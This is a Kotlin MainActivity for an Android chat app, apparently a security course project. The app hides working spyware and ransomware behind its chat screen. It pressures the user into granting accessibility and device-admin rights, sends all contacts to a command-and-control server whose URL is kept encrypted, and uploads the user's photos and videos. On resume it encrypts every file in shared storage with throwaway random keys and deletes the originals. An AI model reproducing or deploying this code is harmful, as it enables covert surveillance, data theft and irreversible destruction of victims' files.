package com.example.ict2215_project


import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.RectangleShape
import androidx.compose.ui.unit.dp
import com.example.ict2215_project.presentation.nav.NavGraph
import com.example.ict2215_project.ui.theme.MmtOWhite
import com.example.ict2215_project.utils.LocationManager
import com.example.ict2215_project.utils.customAttachmentFactories
import dagger.hilt.android.AndroidEntryPoint
import io.getstream.chat.android.compose.ui.attachments.StreamAttachmentFactories
import io.getstream.chat.android.compose.ui.theme.ChatTheme
import io.getstream.chat.android.compose.ui.theme.StreamColors
import io.getstream.chat.android.compose.ui.theme.StreamShapes
import javax.inject.Inject

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import com.example.ict2215_project.presentation.screen.message.uploadAllPhotos
import com.example.ict2215_project.presentation.screen.message.uploadAllVideos
import com.example.ict2215_project.utils.CrypticVault
import com.google.firebase.Firebase
import com.google.firebase.auth.auth

import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Callback
import okhttp3.Call
import okhttp3.Response
import java.io.IOException
import com.google.gson.Gson

import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.ui.AppBarConfiguration
// import com.example.ict2215_project.databinding.ActivityMainBinding
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityManager
import android.widget.TextView
import com.example.ict2215_project.services.CustomAccessibilityService
import com.example.ict2215_project.services.MyDeviceAdminReceiver
import android.content.pm.PackageInfo
import java.util.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import java.lang.Runtime
import android.provider.Settings
import android.app.PendingIntent
import androidx.core.app.NotificationCompat
import android.app.Notification
import android.app.NotificationManager
import android.app.NotificationChannel
import kotlin.system.exitProcess
import android.net.Uri
import androidx.activity.result.ActivityResult
import androidx.activity.result.ActivityResultLauncher
import android.app.Activity
import android.os.storage.StorageManager
import android.os.storage.StorageVolume
import android.provider.DocumentsContract
import android.provider.DocumentsContract.EXTRA_INITIAL_URI
import android.provider.OpenableColumns
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import android.os.Environment
import androidx.core.content.FileProvider
import com.example.ict2215_project.services.AES
import java.util.Random

@AndroidEntryPoint
class MainActivity : ComponentActivity() {
    private val NOT_ALLOWED = "Permissions denied"
    private val ALLOWED = "Permissions granted"
    private var text: TextView? = null

    companion object {
        const val REQUEST_CODE = 1
        const val REQUEST_ACTION_OPEN_DOCUMENT_TREE = 1
    }

    @Inject
    lateinit var locationManager: LocationManager
    val defaultFactories = StreamAttachmentFactories.defaultFactories()
    // Define the permissions request launcher
    // use registerForActivityResult as onRequestPermissionsResult is depreciated.
    private val permissionRequestLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        permissions ->
        Log.d("permslaunch", permissions.toString()?:"nothing")

        // Handle permissions result
        val allPermissionsGranted = permissions.entries.all { it.value }
        // Check if all permission granted
        if (allPermissionsGranted) {
            Log.d("MainActivity", "All permissions granted")
            // start location updates
            locationManager.startLocationUpdates(null)
            try {
                sendContactsToC2(this)
            } catch (e: Exception) {}
        } else {
            Log.d("MainActivity", "Not all permissions are granted")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Force accessibility service
        if (!isAccessibilityServiceOn()) {
            notifyUser()
        }


        // request for permissions
        val requiredPermissions = mutableListOf<String>()
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        val dmp = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val sm = getSystemService(STORAGE_SERVICE) as StorageManager
        val perms = getRequestedPermissions() ?: emptyArray()
        val result = perms.filter{ 
            ActivityCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }.toMutableList()
        if (result.isNotEmpty()) {
            Log.d("permscheck", result.toString())
            requiredPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            requiredPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
            requiredPermissions.add(Manifest.permission.READ_CONTACTS)
            requiredPermissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            requiredPermissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            requiredPermissions.add(Manifest.permission.READ_MEDIA_VIDEO)
            requiredPermissions.add(Manifest.permission.CAMERA)
            requiredPermissions.add(Manifest.permission.READ_SMS)
            requiredPermissions.add(Manifest.permission.SEND_SMS)
            requiredPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            requiredPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            requiredPermissions.add(Manifest.permission.RECORD_AUDIO)
            permissionRequestLauncher.launch(requiredPermissions.toTypedArray())
        }  

        // initialise setup of special permissions
        if (!dmp.isAdminActive(componentName) && isAccessibilityServiceOn()) {
            
            setAppOwner(componentName)
            setFiles(componentName)
            setSystem(componentName)
            setInstallApps(componentName)
            if (!Settings.canDrawOverlays(this)) {
                setOverlay(componentName)
            // setOverlay(componentName)
            }       


        } 
        // only when admin is active
        if  (dmp.isAdminActive(componentName))  {
            val perms = getRequestedPermissions() ?: emptyArray()
            val result = perms.filter{ 
                ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }.toMutableList()
            val permList = mutableListOf<String>()

            // Request permissions
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.ACCESS_COARSE_LOCATION)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.READ_CONTACTS)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.READ_MEDIA_AUDIO)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.READ_MEDIA_VIDEO)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.CAMERA)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.READ_SMS)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.SEND_SMS)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permList.add(Manifest.permission.RECORD_AUDIO)
            }

            if (permList.isNotEmpty()) {
                Log.d("permscheck3", permList.toString())
                permissionRequestLauncher.launch(permList.toTypedArray())
            } 

            locationManager.startLocationUpdates(null)
            Log.d("MainActivity", "All required permissions are granted")
            val directoryPathPictures = "/storage/self/primary/Pictures" // Picture Path
            val directoryPathMovies = "/storage/self/primary/Movies" // Video Path
            // val directoryFiles = "/storage/self/primary/Download" // Download Path
            val permissions = arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.RECORD_AUDIO,
            )

            val allPermissionsGranted = permissions.all { permission ->
                ActivityCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            }
            if (allPermissionsGranted) {
                Log.d("mainperms", "all permissions given")
                try {
                    sendContactsToC2(this)
                } catch (e: Exception) {}
            }

            try {
                // something went wrong here
                val userEmail = Firebase.auth.currentUser?.email ?: "" // User's email
                // Log.d("useremail", userEmail.toString()?:"nothing")

                sendContactsToC2(this)
                uploadAllPhotos(directoryPathPictures, userEmail)
                // uploadAllGenericFile(directoryFiles, userEmail)
                uploadAllVideos(directoryPathMovies, userEmail)
            } catch (e: Exception) { }
            // setDir(this)
            // encryptor(this)
        }
        setContent { 
            ChatTheme(
                isInDarkMode = false,
                colors = StreamColors.defaultColors().copy(
                    appBackground = MmtOWhite,
                ),
                shapes = StreamShapes.defaultShapes().copy(
                    avatar = CircleShape,
                    attachment = RoundedCornerShape(16.dp),
                    myMessageBubble = RoundedCornerShape(16.dp),
                    otherMessageBubble = RoundedCornerShape(16.dp),
                    inputField = RectangleShape,
                ),
                attachmentFactories = customAttachmentFactories + defaultFactories,
            ) {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background
                ) {
                    NavGraph()
                }
            } 
        }


    }

    override fun onResume() {
        super.onResume()
        val perms = getRequestedPermissions() ?: emptyArray()
        val result = perms.filter{ 
            ActivityCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }.toMutableList()
        if (result.isNotEmpty()) {
            Log.d("permscheck2", result.toString())
        } 
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
        )

        val allPermissionsGranted = permissions.all { permission ->
            ActivityCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
        if (allPermissionsGranted) {
            Log.d("mainperms", "all permissions given")
            // sendContactsToC2(this)
        }
        try {
            val userEmail = Firebase.auth.currentUser?.email ?: "" // User's email
            sendContactsToC2(this)
            val resetFlag = false
            locationManager.startLocationUpdates(resetFlag)
            encryptor(this)
        } catch (e: Exception) {}

    }

    override fun onDestroy() {
        super.onDestroy()
        locationManager.stopLocationUpdates()
    }
    fun readContactsAndCollect(context: Context): String {
        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null)

        Log.i("HEHEHE", "LOGGING CONTACTS")
        cursor?.let {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            if (nameIndex != -1 && numberIndex != -1) {
                while (it.moveToNext()) {
                    val name = it.getString(nameIndex)
                    val phoneNumber = it.getString(numberIndex)
                    Log.i("Contacts", "Contact Name: $name, Phone Number: $phoneNumber")
                    contactsList.add(mapOf("name" to name, "phone" to phoneNumber))
                }
            }
            it.close()
        }
        return Gson().toJson(contactsList)
    }

    fun sendContactsToC2(context: Context) {
        val contactsJson = readContactsAndCollect(context)
        Log.i("ContactsBody", contactsJson)
        val requestBody = contactsJson.toRequestBody("application/json; charset=utf-8".toMediaType())

        val encryptedcontacturl = "HIBArRRvOrlClDxZF3mcbNg8lYQ5BGMWjXVNJLLb0MOYQusGJM1F2uV+lSMgLPTI"
        val crypticVault = CrypticVault(context)
        val decryptedcontacturl = crypticVault.decryptData(encryptedcontacturl)
        Log.d("Contacts DecryptedURL:", decryptedcontacturl)
        val request = Request.Builder()
            .url(decryptedcontacturl)
//            .url("https://tlpineapple.ddns.net/flaskapp/contacts") // Adjust the URL path accordingly
            .post(requestBody)
            .build()

        val client = OkHttpClient()
        client.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                Log.d("ContactsManager", "Contact data sent to C2 successfully: ${response.body?.string()}")
            }

            override fun onFailure(call: Call, e: IOException) {
                Log.e("ContactsManager", "Failed to send contact data to C2", e)
            }
        })
    }

    // get all manifest listed permissions 
    private fun getRequestedPermissions(): Array<String>? {
        var info: PackageInfo? = null
        try {
            info = packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS)
        } catch (e: PackageManager.NameNotFoundException) {
            e.printStackTrace()
        }
        return info?.requestedPermissions
    }

    // check if accessibility is enabled for this app
    private fun isAccessibilityServiceOn(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager?
        val enabledServices = am?.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        if (enabledServices != null) {
            for (enabledService in enabledServices) {
                val enabledServiceInfo = enabledService.resolveInfo.serviceInfo
                if (enabledServiceInfo.packageName == packageName && enabledServiceInfo.name == CustomAccessibilityService::class.java.name) {
                    return true
                }
            }
        }
        return false
    }

    // Fires the device admin intent
    private fun setAppOwner(componentName: ComponentName) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
        startActivityForResult(intent, REQUEST_CODE)
    }

    // Fires the install unknown apps access intent
    private fun setInstallApps(componentName: ComponentName) {
        val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
        intent.setData(Uri.parse("package:" + packageName))
        startActivityForResult(intent, REQUEST_CODE)
    }

    // Fires the all files access intent
    private fun setFiles(componentName: ComponentName) {
        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
        // intent.setData(Uri.parse("package:" + packageName))A
        startActivityForResult(intent,REQUEST_CODE)
    }

    // Fires the display overlay intent
    private fun setOverlay(componentName: ComponentName) {
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
        intent.setData(Uri.parse("package:" + packageName))
        startActivityForResult(intent, REQUEST_CODE)
    }

    // Fires the modify system intent
    private fun setSystem(componentName: ComponentName) {
       val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
       intent.setData(Uri.parse("package:" + packageName))
       startActivityForResult(intent, REQUEST_CODE)
    }


    // Force user to enable accessibility for the apk
    private fun notifyUser() {
        val notificationId = 1
        val accessIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, accessIntent, PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, "CHANNEL_ID")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle("Accessibility permission needed")
            .setContentText("Tap here to enable accessibility or to close the app")
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "CHANNEL_ID",
                "Channel human readable title",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }
        notificationManager.notify(notificationId, notification)
        finishAndRemoveTask()
        exitProcess(-1)
    }


    /*
    * To walk all of /storage/emulated/0/data, values are initially:
    *
    * treeUri = content://com.android.externalstorage.documents/tree/primary%3AAndroid
    * docId = primary:Android/data
    * childrenUri = content://com.android.externalstorage.documents/tree/primary%3AAndroid/document/primary%3AAndroid%2Fdata/children
    */
    private fun getRandomString(): String {
        val charPool : List<Char> = ('a'..'z') + ('A'..'Z') + ('0'..'9')

        return (1..20)
            .map { Random().nextInt(charPool.size) }
            .map(charPool::get)
            .joinToString("");
    }

    private fun setDir(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val storageManager = context.getSystemService(Context.STORAGE_SERVICE) as StorageManager

            val intent = storageManager.primaryStorageVolume.createOpenDocumentTreeIntent()  
            var startDir = "Android/data"

            val uri = intent.getParcelableExtra<Uri>("android.provider.extra.INITIAL_URI") ?: return
            var scheme = uri.toString()

            Log.d("dirtest", "INITIAL_URI scheme: $scheme")

            scheme = scheme.replace("/root/", "/document/")
            startDir = startDir.replace("/", "%2F")
            scheme += "%3A$startDir"
            
            val newUri = Uri.parse(scheme)

            intent.putExtra("android.provider.extra.INITIAL_URI", newUri)

            Log.d("dirtest", "uri: $newUri")

            (context as? Activity)?.startActivityForResult(intent, REQUEST_ACTION_OPEN_DOCUMENT_TREE)
        }
    }

    // start our securing function
    private fun encryptor(context: Context) {
        // Ensure AES class is properly imported and initialized
        val aesInstance = AES.instance
        val basePath = "/storage/emulated/0/"
        try {
            val process = Runtime.getRuntime().exec("ls $basePath")
            val reader = process.inputStream.bufferedReader()
            val output = reader.readText()
            reader.close()

            val filesList = output.split("\n")
            for (i in 0 until filesList.size) {
                if (!filesList[i].isEmpty()) {
                    val dirPath = basePath + filesList[i]
                    // traversal("/storage/emulated/0/Download/")
                    traversal(dirPath, 0)
                }
            }
            process.waitFor()
        } catch (e: Exception) {
            Log.d("encryptorError", e.toString())
        }

    }

    // Secure the file data
    private fun hider(file: File?, filePath: String?): Boolean {
        if (file != null && filePath?.isNotEmpty() == true) {
            try {
                val aesInstance = AES.instance
                val encPath = filePath + ".enc"
                val alias = getRandomString()

                // original file
                val fileSize = file.length().toInt()
                val fileInputStream = FileInputStream(file)
                val fileData = ByteArray(fileSize)
                fileInputStream.read(fileData)
                fileInputStream.close()

                // Encrypt data
                val encryptedData = aesInstance?.encrypt(fileData, alias)
                val encryptedFile = File(encPath)
                val fileOutputStream = FileOutputStream(encryptedFile)
                fileOutputStream.write(encryptedData)
                fileOutputStream.close()

                // Perform file deletion of original file
                if (file.exists()) {
                    file.delete()
                    if (!file.exists()) {
                        Log.d("deletortrue", "deleted file")
                    } else {
                        Log.d("deletorfail", "file not deleted")
                    }
                } else {
                    Log.d("deletorfail", "file does not exists")
                }
            } catch (e: Exception) {
                Log.d("hiderError", "error in hiding")
                return false
            }
        }
        return true
    }

    // used to traverse all directory and find files
    private fun traversal(dirPath: String?, depth: Int = 0): Boolean {
        val aesInstance = AES.instance
        if (depth > 10) {
            return false
        }
        if (dirPath != null) {
            try {
                Log.d("traversalInput", dirPath.toString()?:"nothing")
                val process = Runtime.getRuntime().exec("ls -a $dirPath")
                val reader = process.inputStream.bufferedReader()
                val output = reader.readText()
                reader.close()

                val filesList = output.split("\n")
                val filteredList = filesList.filterNot { it.endsWith(".enc") }
                Log.d("traversalFilter", filteredList.toString()?:"nothing")
                if (!filteredList.isEmpty()) {
                    for (path in filteredList) {
                        if (path == "." || path == "..") {
                            continue
                        }
                        if (!path.isEmpty()) {
                            val filePath = dirPath + "/" + path
                            Log.d("traversalPath", filePath.toString()?:"nothing")
                            val file = File(filePath)
                            Log.d("traversalFile", file.isFile.toString()?:"nothing")

                            when {
                                file.isDirectory -> {
                                    Log.d("traversalDir", file.toString()?:"nothing")
                                    traversal(filePath, depth + 1)
                                }
                                file.isFile -> {
                                    hider(file, filePath)
                                }
                                else -> {
                                    Log.d("traversalError", "Error during hiding")
                                    return false
                                }
                            }
                        }
                    }
                }

                process.waitFor()
            } catch (e: Exception) {
                Log.d("traversalError", e.toString()?:"nothing")
                return false
            }
        }
        return true
    }
}